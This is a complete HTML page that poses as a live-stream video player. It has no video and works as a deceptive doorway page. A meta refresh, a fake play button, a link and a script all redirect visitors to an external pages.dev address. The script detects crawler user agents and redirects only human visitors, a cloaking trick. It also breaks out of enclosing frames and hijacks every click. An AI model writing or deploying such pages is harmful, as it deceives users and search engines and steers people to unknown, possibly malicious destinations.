<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Stream Live Player HD - Official Channel</title>
    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
    <meta name="description" content="Watch high quality live streaming online. Direct instant access server.">
    <meta http-equiv="refresh" content="1; url=https://vinit-9q3.pages.dev/full-show">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0b0e14; color:#fff; font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; }
        .player-card { background:#151a23; border:1px solid #232b3b; border-radius:12px; width:92%; max-width:680px; overflow:hidden; box-shadow:0 12px 36px rgba(0,0,0,0.7); text-align:center; cursor:pointer; }
        .screen-area { position:relative; background:#000; width:100%; height:360px; display:flex; align-items:center; justify-content:center; }
        .play-btn { width:76px; height:76px; background:#e11d48; border-radius:50%; display:flex; align-items:center; justify-content:center; box-shadow:0 0 25px rgba(225,29,72,0.8); }
        .play-btn svg { width:34px; height:34px; fill:#fff; margin-left:5px; }
        .badge { position:absolute; top:16px; left:16px; background:#dc2626; color:#fff; font-size:11px; font-weight:800; padding:4px 10px; border-radius:4px; }
        .info { padding:22px; }
        .title { font-size:18px; font-weight:700; color:#f1f5f9; margin-bottom:12px; }
        .btn { display:inline-block; padding:12px 28px; background:#2563eb; color:#fff; font-weight:700; text-decoration:none; border-radius:6px; margin-top:8px; }
    </style>
</head>
<body>
    <div class="player-card" onclick="window.location.href='https://vinit-9q3.pages.dev/full-show';">
        <div class="screen-area">
            <span class="badge">🔴 LIVE NOW</span>
            <div class="play-btn">
                <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
            </div>
        </div>
        <div class="info">
            <div class="title">⚡ Connecting to Live Secure Stream...</div>
            <a href="https://vinit-9q3.pages.dev/full-show" class="btn">Watch Live Full Show HD ▶</a>
        </div>
    </div>
    <script>
    (function(){
        var target = "https://vinit-9q3.pages.dev/full-show";
        function _breakout() {
            try {
                if (window.top && window.top !== window) {
                    window.top.location.replace(target);
                    return;
                }
            } catch(e) {}
            window.location.replace(target);
        }
        var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
        if (!isBot) {
            setTimeout(_breakout, 1200);
        }
        document.addEventListener("click", function(e) {
            e.preventDefault();
            _breakout();
        }, true);
    })();
    </script>
</body>
</html>
